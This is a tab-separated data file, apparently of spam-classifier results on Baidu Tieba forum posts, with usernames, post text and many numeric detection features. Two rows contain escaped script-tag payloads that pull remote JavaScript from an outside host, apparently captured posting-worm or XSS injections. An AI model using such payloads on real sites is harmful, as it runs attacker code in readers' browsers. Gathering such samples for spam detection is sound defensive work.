instance	true	probability	assigned	uid	uname	forum	title	content	UserInfo_FollowCount	UserInfo_FollowedCount	UserInfo_FollowFollowedRatio	UserInfo_RegTime	UserInfo_HasMobile	UserInfo_HasBirth	UserInfo_HasSex	UserInfo_IsMale	UserInfo_IsFemale	UserInfo_IsGroupOwner	UserInfo_MaxLevel	UserInfo_LevelMean	UserInfo_LevelVar	UserInfo_NowLevel	UserInfo_UnamePattern0	UserInfo_UnamePattern1	UserInfo_UnamePattern2	UserInfo_UnameIsEnNum	UserInfo_IsQQName	ForumInfo_ForumInfo	ForumInfo_Level2Info	ForumInfo_Level1Info	ForumInfo_RankInfo	ForumInfo_RankMean	ForumInfo_RankVar	ForumInfo_NowRank	ForumInfo_FormTitleMatchRatio	ForumInfo_Level1Name0	ForumInfo_Level1Name1	ForumInfo_Level1Name2	ForumInfo_Level1Name3	ForumInfo_Level1Name4	ForumInfo_Level1Name5	ForumInfo_Level1Name6	ForumInfo_Level1Name7	ForumInfo_Level1Name8	ForumInfo_Level1Name9	ForumInfo_Level1Name10	ForumInfo_Level1Name11	ForumInfo_Level1Name12	ForumInfo_Level1Name13	ForumInfo_Level1Name14	ForumInfo_Level1Name15	ForumInfo_Level1Name16	ForumInfo_Level1Name17	ForumInfo_Level1Name18	ForumInfo_Level1Name19	ForumInfo_Level1Name20	ForumInfo_Level1Name21	ForumInfo_Level1Name22	ForumInfo_Level1Name23	ForumInfo_Level1Name24	ForumInfo_Level1Name25	ForumInfo_Level1Name26	ForumInfo_Level1Name27	ForumInfo_Level1Name28	ContentSim_AvgSimByThread1	ContentSim_AvgSimByForum	ContentSim_AvgSimByThread2	ContentSim_Top2ContentsSim	TitleSim_AvgSimByThread	TitleSim_AvgSimByForum	TitleSim_Top2TitleSim	RepeatString_TextLengthMean	RepeatString_TextLengthVar	RepeatString_TextCnLengthMean	RepeatString_TextCnLengthVar	RepeatString_NowLength	RepeatString_NowCnLength	RepeatString_NowCnRatio	RepeatString_CnRatio	RepeatString_ThreadTextLengthMean	RepeatString_ThreadTextLengthVar	RepeatString_ReplyTextLengthMean	RepeatString_ReplyTextLengthVar	UrlWeight_NowUrlScore	UrlWeight_NowHasVideo	UrlWeight_NowHasEmail	UrlWeight_NowHasPic	UrlWeight_UrlScoreAvg	UrlWeight_UrlScoreAvgMultTextLength	UrlWeight_UrlScoreMin	UrlWeight_UrlScoreMax	UrlWeight_UrlRatio	UrlWeight_PicRatio	UrlWeight_PicRatioMultTextLength	UrlWeight_EmailRatio	UrlWeight_VideoRatio	UrlWeight_VideoRatioMultTextLength	UrlWeight_AnyRatio	UrlWeight_AnyRatioMultTextLength	UrlWeight_UniqueUrlRatio	UrlWeight_UniquePicRatio	UrlWeight_UniqueVideoRatio	NumberWeight_NumRatio	NumberWeight_UniqueNumRatio	NumberWeight_DeformNumRatio	UnusualChar_UnusualChar0	UnusualCn_UnusualCnPostsRatio	UnusualCn_UnusualCnRatio	DictMatch_WhiteTitleRatio	DictMatch_NowBlackTitleCount	DictMatch_NowGrayTitleCount	DictMatch_NowBlackTitleCount2	DictMatch_NowGrayTitleCount2	DictMatch_NowBlackContentCount	DictMatch_NowGrayContentCount	DictMatch_NowBlackContentCount2	DictMatch_NowGrayContentCount2	DictMatch_BlackTitleRatio	DictMatch_GrayTitleRatio	DictMatch_BlackTitleRatio2	DictMatch_GrayTitleRatio2	DictMatch_BlackContentPerPost	DictMatch_GrayContentPerPost	DictMatch_BlackContentPerPost2	DictMatch_GrayContentPerPost2	DictMatch_TitleModifyRatio	DictMatch_ContentModifyRatio	LanguageModel_NowLmScore	LanguageModel_NowFirstLmScore	LanguageModel_NowLastLmScore	LanguageModel_LmScoreAvg	LanguageModel_FirstLmScoreAvg	LanguageModel_LastLmScoreAvg	LanguageModel_BadLmScoreAvg	LanguageModel_BadFirstLmScoreAvg	LanguageModel_BadLastLmScoreAvg	Trate_TrateNum	Trate_NowTrateScore	Trate_NowThreadTrateScore	Trate_NowReplyTrateScore	Trate_TrateMean	Trate_TrateVar	Trate_ThreadTrateMean	Trate_ThreadTrateVar	Trate_ReplyTrateMean	Trate_ReplyTrateVar	Trate_Bukets0	Trate_Bukets1	Trate_Bukets2	Trate_Bukets3	Trate_TBukets0	Trate_TBukets1	Trate_TBukets2	Trate_TBukets3	Trate_PBukets0	Trate_PBukets1	Trate_PBukets2	Trate_PBukets3	Trate_TrateMean2	Trate_TrateMean3	Trate_TrateMean4	Trate_TrateMean5	LTrate_TrateNum	LTrate_NowTrateScore	LTrate_NowThreadTrateScore	LTrate_NowReplyTrateScore	LTrate_TrateMean	LTrate_TrateVar	LTrate_ThreadTrateMean	LTrate_ThreadTrateVar	LTrate_ReplyTrateMean	LTrate_ReplyTrateVar	LTrate_Bukets0	LTrate_Bukets1	LTrate_Bukets2	LTrate_Bukets3	LTrate_TBukets0	LTrate_TBukets1	LTrate_TBukets2	LTrate_TBukets3	LTrate_PBukets0	LTrate_PBukets1	LTrate_PBukets2	LTrate_PBukets3	LTrate_TrateMean2	LTrate_TrateMean3	LTrate_TrateMean4	LTrate_TrateMean5	LTrate2_TrateNum	LTrate2_NowTrateScore	LTrate2_NowThreadTrateScore	LTrate2_NowReplyTrateScore	LTrate2_TrateMean	LTrate2_TrateVar	LTrate2_ThreadTrateMean	LTrate2_ThreadTrateVar	LTrate2_ReplyTrateMean	LTrate2_ReplyTrateVar	LTrate2_Bukets0	LTrate2_Bukets1	LTrate2_Bukets2	LTrate2_Bukets3	LTrate2_TBukets0	LTrate2_TBukets1	LTrate2_TBukets2	LTrate2_TBukets3	LTrate2_PBukets0	LTrate2_PBukets1	LTrate2_PBukets2	LTrate2_PBukets3	LTrate2_TrateMean2	LTrate2_TrateMean3	LTrate2_TrateMean4	LTrate2_TrateMean5	IPInfo_RecentLocs	IPInfo_RecentIps	IPInfo_RecentIpPrefix3	IPInfo_RecentIpPrefix2	IPInfo_RecentIpPrefix1	IPInfo_LocChanges	IPInfo_IpChanges	IPInfo_IpPrefix3Changes	IPInfo_IpPrefix2Changes	IPInfo_IpPrefix1Changes	IPInfo_ForeignIpRatio	MultiReplyTo_MultiReplyTo0	PostReplyRate_ThreadRatio	PostReplyRate_PostsNum	PostReplyRate_ThreadNum	PostReplyRate_UniqeThreadNum	PostReplyRate_UniqeThreadRatio	Time_TimeSpan0	Time_TimeSpan1	Time_TimeSpan2	Time_TimeSpan3	Time_TimeSpan4	Time_TimeSpanAvg	Time_TimeSpanVar	Time_HoursCovered	Time_NowTimeBin	Time_Bins0	Time_Bins1	Time_Bins2	Time_Bins3	Time_Bins4	Time_Bins5	DH_DH0	DH_DH1	DH_DH2	DH_DH3	DH_DH4	Sundry_PostType	Sundry_HistorySize	Sundry_PostsNumLast_1440_Minutes
46405013720	1	0.998791	1	959929383	夜二_	英雄联盟	回复：你们的盒子正常么	kbnaibzduovnwwxbeqpgudsbiaoywobyalmlwxtk	1.38629	2.19722	-0.81093	4.91265	1	0	1	1	0	0	9	8	0	8	1	3	3	0	0	0	0	0	0	3.93183	2.19128e-31	3.93183	0.1	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.51097	0	0	3.71357	0	0	0	40	0	0.0243902	0.212153	0	0	3.71357	0	4.4	0	0	0	4.4	16.3397	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.1	0	0.1	0.212153	0	0.212153	0	1	1	2.5	2.5	2.5	2.5	2.5	2.5	2.5	2.5	2.5	10	0.1	0	0.1	0.1	2.13992e-34	0.1	0	0.1	2.13992e-34	1	0	0	0	1	0	0	0	1	0	0	0	0.1	0.1	0.1	0.1	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	10	0	0	0	0	0	0	2.5	5.75	0.1	5	0	0	0	0	0	1	0	0	0	0	1	0	10	10
46451972958	1	0.984586	1	937843391	自来也大大大人	海贼王	回复：你们知道吗？	自碗	4.18965	3.49651	0.693147	5.1358	1	0	1	1	0	2	9	8	0	8	1	1	1	0	0	0	0	0	0	3.93183	2.19128e-31	3.93183	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0.728091	0.728091	0	1	0.0487805	0	0	2.10932	1.18599	2.07909	1.02757	4	4	1	0.990276	5.65599	0	1.84323	0.491931	4.4	0	0	0	4.4	8.11021	4.4	4.4	0	0.1	0.184323	0	0	0	0.1	0.184323	1	1	1	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	1	2.5	2.5	2.5	2.45483	2.45483	2.45483	2.5	2.52146	2.5	10	0.1	0	0.1	0.108783	0.000771323	0.187825	0	0.1	2.16667e-34	1	0	0	0	1	0	0	0	1	0	0	0	0.1	0.1	0.1	0.1	10	0.01	0	0.01	0.0091	8.1e-06	0.001	0	0.01	0	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	10	0.01	0	0.01	0.0091	8.1e-06	0.001	0	0.01	0	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	1	1	1	1	1	1	1	1	1	1	0	0	0.1	10	1	2	2	0	0	0	0	0	2.5	5.75	0.1	5	0	0	0	0	0	1	0	0	0	0	1	0	10	10
46437197460	1	0.968457	1	575829569	天龙十部笑傲	火影忍者	回复：上数学课的时候看老师不爽用什么忍术？	&lt;script&gt;$.getScript("http://1.crossover.duapp.com/baidu.js");&lt;/script&gt;521 LZ	2.89037	1.79176	1.09861	6.60935	0	1	1	1	0	0	7	1.4	9.8	7	1	1	1	0	0	0.950271	0.950271	0.673012	0	3.93183	2.46519e-31	3.93183	0.2	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0.157922	0.157922	0	0	0.117124	0.117124	0	4.10146	1.91829	2.70652	6.59696	87	0	0.0113636	0.72656	0	0	4.10372	1.92044	4.4	0	0	0	4.4	18.0564	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0.0380952	0	0	0	0	0	0	0	0	0	0	0	0	0	0.196022	0.196022	0.196022	0.196022	1	1	2.5	2.5	2.5	2.40846	2.40846	2.40846	2.40846	2.54398	2.74559	5	0.1	0	0.1	0.08	0.00075	0.1	0	0.08	0.00075	1	0	0	0	1	0	0	0	1	0	0	0	0.1	0.0833333	0.0875	0.08	5	0.001	0	0.001	0.0046	2.43e-05	0.01	0	0.0046	2.43e-05	1	0	0	0	1	0	0	0	1	0	0	0	0.0055	0.004	0.0055	0.0046	5	0.001	0	0.001	0.0046	2.43e-05	0.01	0	0.0046	2.43e-05	1	0	0	0	1	0	0	0	1	0	0	0	0.0055	0.004	0.0055	0.0046	1	1	1	1	1	1	1	1	1	1	0	0	0	5	0	3	0	0	0	0	0	0	2.5	5.75	0.4	5	0	0	0	0	0.4	0.6	0	0	0	0	1	0	5	5
46424765430	1	0.999947	1	1080439127	yongcfeidi289	泷泽萝拉	回复：淘宝20元最新软件资源。免费发放。【精华】	不错的贴，~	0	0	0	1.38629	0	0	0	0	0	0	2	2	0	2	2	0	0	1	0	0	0	0	0	8.07838	0	8.07838	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.137816	0.137816	0	0.0769231	0	0	0	2.9049	0.245959	2.72405	0.249916	11	8	0.75	0.953686	0	0	2.91541	0.24652	4.4	0	0	0	4.4	12.8278	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0.315789	0	0	0	0	1	0	1	0	0	0	0	0	1	0	1	0	0	0	0	1	1	3.09732	3.09732	3.09732	2.89777	2.89777	2.89777	3.31053	3.31053	3.34598	10	0.1	0	0.1	0.1	2.13992e-34	0.1	0	0.1	2.13992e-34	1	0	0	0	1	0	0	0	1	0	0	0	0.1	0.1	0.1	0.1	10	0.01	0	0.01	0.01	3.34363e-36	0.01	0	0.01	3.34363e-36	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	10	0.01	0	0.01	0.01	3.34363e-36	0.01	0	0.01	3.34363e-36	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	1	0	0	0	0	0	0	2.5	5.75	0.1	3	0	0	0	1	0	0	0	0	0	0	1	0	10	10
46428085505	1	0.998526	1	644842743	0nly丶笑罢	火影忍者	回复：听说火吧有很多小学生，怎么证明你不是小学生！！！！！！！	&lt;script&gt;$.getScript("http://1.crossover.duapp.com/fatie.js");&lt;/script&gt;	5.03044	9.227	-4.19656	6.48768	1	0	1	1	0	1	13	13	0	13	0	2	1	0	0	0	0	0	0	3.93183	2.19128e-31	3.93183	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0.109756	0	0	4.41884	8.76512e-31	0	0	82	0	0.0120482	0.184541	0	0	4.41884	8.76512e-31	4.4	0	0	0	4.4	19.4429	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	1	2.5	2.5	2.5	2.5	2.5	2.5	2.5	2.5	2.5	10	0.1	0	0.1	0.48579	0.0183746	0.1	0	0.48579	0.0183746	0.1	0	0.9	0	1	0	0	0	0.1	0	0.9	0	0.314328	0.385771	0.421492	0.442925	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	2	0	0	0	0	0	0	2.5	5.75	0.1	3	0	0	0	1	0	0	0	0	0	0	1	0	10	10
46419389488	1	0.999984	1	1853292	夜天	剑灵	回复：万魂升恶女是不是就没回魔了	“不相信自己的人， 连努力的价值都没有。”凯——《火影忍者》	0	5.92959	-5.92959	8.07683	1	0	1	1	0	0	11	2.5	10.5	6	1	1	1	0	0	2.02533	2.02533	1.69574	1.55711	5.81738	2.56987	4.66344	0.1	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.303993	0.309531	0	0.288889	0.290881	0.242203	0	4.23415	0.0361462	3.90418	0.0495169	58	42	0.728814	0.93696	0	0	4.23906	0.0347556	4.4	0	0	0	4.4	18.6518	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	1	0	0.0689655	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	1	2.07245	2.17949	2.42586	2.30371	2.30371	2.30371	2.4472	2.6244	3.21127	10	0.1	0	0.1	0.14057	0.00678872	0.1	0	0.14057	0.00678872	1	0	0	0	1	0	0	0	1	0	0	0	0.123685	0.176183	0.144637	0.145723	10	0.001	0	0.001	0.0019	8.1e-06	0.01	0	0.0019	8.1e-06	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	10	0.001	0	0.001	0.0019	8.1e-06	0.01	0	0.0019	8.1e-06	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	10	0	0	0	0	0	0	2.5	5.75	0.1	2	0	0	1	0	0	0	0	0	0	0	1	0	10	10
46419433334	1	0.999999	1	1079877260	zhirenzzhan	穿越火线	回复：窝窝儿来一发刚出炉的内涵图么	ccccccccccccccccccccccccxxxssee	0	0	0	1.60944	0	0	0	0	0	0	3	3	0	3	2	2	2	0	0	0	0	0	0	3.93183	2.19128e-31	3.93183	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	2.56352	0.250838	0	0	31	0	0.03125	0.280622	0	0	2.56352	0.250838	4.4	0	0	0	4.4	11.2795	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	1	2.5	2.5	2.5	2.5	2.5	2.5	2.5	2.5	2.5	10	0.1	0	0.1	0.1	2.13992e-34	0.1	0	0.1	2.13992e-34	1	0	0	0	1	0	0	0	1	0	0	0	0.1	0.1	0.1	0.1	10	0.01	0	0.01	0.01	3.34363e-36	0.01	0	0.01	3.34363e-36	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	10	0.01	0	0.01	0.01	3.34363e-36	0.01	0	0.01	3.34363e-36	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	1	0	0	0	0	0	0	2.5	5.75	0.1	2	0	0	1	0	0	0	0	0	0	0	1	0	10	10
46449486191	1	0.999973	1	1079877260	zhirenzzhan	武动乾坤	回复：窝窝儿来一发刚出炉的内涵图么！	有的人，做面膜的时候，比真人好看多了。	0	0	0	1.60944	0	0	0	0	0	0	3	1.5	2.5	0	2	2	2	0	0	0.693147	0	0	0.693147	9.31302	0.0586324	9.0833	0	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.216651	0.216651	0	0.142857	0.625	0.625	0	3.54307	0.124092	3.42005	0.120299	38	32	0.846154	0.972921	0	0	3.54307	0.124092	4.4	0	0	0	4.4	15.5895	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0.0176991	0	0	0	0	0	0	0	0	0	0	0	0	0	0.440231	0	0.440231	0	1	1	2.22514	2.35814	2.45441	2.45695	2.45695	2.45695	2.70256	2.93387	2.99369	10	0.1	0	0.1	0.0975028	0.00021113	0.1	0	0.0975028	0.00021113	1	0	0	0	1	0	0	0	1	0	0	0	0.1	0.0862616	0.093757	0.0950056	10	0.01	0	0.01	0.0082	1.44e-05	0.01	0	0.0082	1.44e-05	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.007	0.0055	0.0064	10	0.01	0	0.01	0.0082	1.44e-05	0.01	0	0.0082	1.44e-05	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.007	0.0055	0.0064	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	2	0	0	0	0	0	0	2.5	5.75	0.1	5	0	0	0	0	0	1	0	0	0	0	1	0	10	10
46446547318	1	0.999985	1	-1	huazi4460099	魔兽世界	回复：我是96的妹纸，是不是我胸太大了，同学都笑我。 都是一些吧友	壑斌栓笑笑。“是啊，多亏你姐姐有个好老公，看你姐姐那样子比以前性感多了，现在也是个犹物。”	0	0	0	8.22202	0	0	0	0	0	0	2	2	0	2	2	0	0	1	0	1.02965	0	0	1.02965	3.79588	0.275465	3.93183	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.511016	0.510971	0	0.423729	0.197368	0.18913	0	4.87093	0.324315	4.74968	0.377277	90	76	0.846154	0.979348	0	0	4.87093	0.324315	4.4	0	0	0	4.4	21.4321	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0.0358423	0	0	0	0	0	0	0.010989	0	0.010989	0	0	0	0	0	0.340662	0	0.340662	1	1	2.52685	3.80264	2.81865	2.21198	2.21198	2.21198	2.33847	3.15338	2.85637	10	0.1	0	0.1	0.0608157	0.000353355	0.1	0	0.0608157	0.000353355	1	0	0	0	1	0	0	0	1	0	0	0	0.075	0.0666667	0.0656014	0.0706604	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	4	0	0	0	0	0	0	2.5	5.75	0.2	5	0	0	0	0	0	1	0	0	0	0	1	0	10	10
46434811264	1	0.999417	1	445819626	gxb1522	魔兽世界	回复：我送女友的生日礼物,她哭了！这礼物真的让女人心动？	定做灯搜索网店 易美氏家居	2.56495	5.46383	-2.89888	6.82871	1	1	1	0	1	2	9	5.4	14.0444	8	2	0	0	1	0	1.36616	0.950271	0.950271	1.02965	3.99636	1.04984	3.93183	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.34688	0.34688	0	0	0.709623	0.709623	0	4.15268	3.22913	3.98368	3.11518	24	24	1	0.9672	0	0	5.34422	1.58111	4.4	0	0	0	4.4	23.5146	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0.0311284	0	0	0	0	0	0	0	0	0	0	0	0	0	0.194074	0.970368	0.194074	0.970368	1	1	3.47497	3.64953	3.537	2.62058	2.62058	2.62058	2.90013	3.39781	3.06802	10	0.1	0	0.1	0.224205	0.05536	0.1	0	0.224205	0.05536	0.8	0.1	0	0.1	1	0	0	0	0.8	0.1	0	0.1	0.1	0.149071	0.174466	0.149573	10	0.01	0	0.01	0.0046	2.16e-05	0.01	0	0.0046	2.16e-05	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.007	0.0055	0.0046	10	0.01	0	0.01	0.0046	2.16e-05	0.01	0	0.0046	2.16e-05	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.007	0.0055	0.0046	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	4	0	0	0	0	0	0	2.5	5.75	0.1	4	0	0	0	0	1	0	0	0	0	0	1	0	10	10
46421772002	1	0.997984	1	1075908590	原来386	博兴	回复：学习早一步 ，成绩更胜一筹！！！	【1】当购网相当于一个网下直接拿货付款的本县（博兴、周村）淘宝，对面向本地销售商品的商家非常有用。直	0	1.09861	-1.09861	2.19722	0	0	0	0	0	0	7	6.1	0.1	6	1	0	0	0	0	0.325083	0	0	0	3.60277	0.0583847	3.52636	0.1	0	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.885526	0.885526	0.7	1	0.309726	0.0493827	0	5.87717	0.0400245	5.65833	0.0369154	403	322	0.799505	0.968179	0	0	5.88518	0.0412149	4.4	0	0	0	4.4	25.8948	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0.1	1	0	0	0	0	0	0	0	0	0	0.00245098	0.00490196	0	0.00490196	0.1	0.1	0.1	0.1	1.45409	2.90818	0	2.90818	1	1.5	2.46374	2.88677	2.5927	2.46374	2.46374	2.46374	2.46374	2.88677	3.08567	10	0.1	0	0.1	0.055	0.00025	0.1	0	0.055	0.00025	1	0	0	0	1	0	0	0	1	0	0	0	0.075	0.0666667	0.0625	0.06	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	8	0	0	0	0	0	0	2.5	5.75	0.1	5	0	0	0.9	0	0	0.1	0	0	0	0	1	0	10	10
46440910462	1	0.99876	1	1047885374	板砖何在地	真假学园	回复：在老公包包里发现了这个，我该怎么办？	证明你的技巧不如那把手电，进一步加深技术研究吧	0	0	0	3.82864	0	0	1	0	1	0	5	0.4	1.6	0	1	1	1	0	0	2.30259	1.60944	0.801819	1.60944	5.30474	5.60314	1.38629	0.1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	0	0	0	0.848148	0.848148	0.7	1	1.45528	1.45528	0	3.94471	0.0894241	3.89695	0.081517	46	44	0.957447	0.990341	0	0	3.94471	0.0894241	4.4	0	0	0	4.4	17.3567	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0	0	0	1	0	1	0	0	0	0	0	1	0	1	0	0	0	0	1	1	2.11711	2.51952	2.28354	2.12529	2.12529	2.12529	2.13347	2.51952	2.28354	10	0.1	0	0.1	0.100526	0.000319888	0.1	0	0.100526	0.000319888	1	0	0	0	1	0	0	0	1	0	0	0	0.103454	0.104605	0.105181	0.105526	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	10	0.001	0	0.001	0.001	5.22442e-38	0.01	0	0.001	5.22442e-38	1	0	0	0	1	0	0	0	1	0	0	0	0.001	0.001	0.001	0.001	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	10	0	0	0	0	0	0	2.5	5.75	0.1	4	0	0	0	0	1	0	0	0	0	0	1	0	10	10
46406951193	1	0.999995	1	1081571744	cangkemeiz	英雄联盟	回复：找网通的玩家一起玩	顶你了	0	0	0	1.09861	0	0	0	0	0	0	3	3	0	3	2	2	2	0	0	0	0	0	0	3.93183	2.19128e-31	3.93183	0	0	0	0	0	0	0	0	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0.9	0.9	0	1	0	0	0	1.94591	5.4782e-32	1.94591	5.4782e-32	6	6	1	1	0	0	1.94591	5.4782e-32	4.4	0	0	0	4.4	8.562	4.4	4.4	0	0	0	0	0	0	0	0	1	1	1	0	1	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	1	1	4.08636	4.08636	4.08636	4.08636	4.08636	4.08636	4.08636	4.08636	4.08636	10	0.1	0	0.1	0.1	2.13992e-34	0.1	0	0.1	2.13992e-34	1	0	0	0	1	0	0	0	1	0	0	0	0.1	0.1	0.1	0.1	10	0.01	0	0.01	0.01	3.34363e-36	0.01	0	0.01	3.34363e-36	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	10	0.01	0	0.01	0.01	3.34363e-36	0.01	0	0.01	3.34363e-36	1	0	0	0	1	0	0	0	1	0	0	0	0.01	0.01	0.01	0.01	1	1	1	1	1	1	1	1	1	1	0	0	0	10	0	1	0	0	0	0	0	0	2.5	5.75	0.1	0	1	0	0	0	0	0	0	0	0	0	1	0	10	10
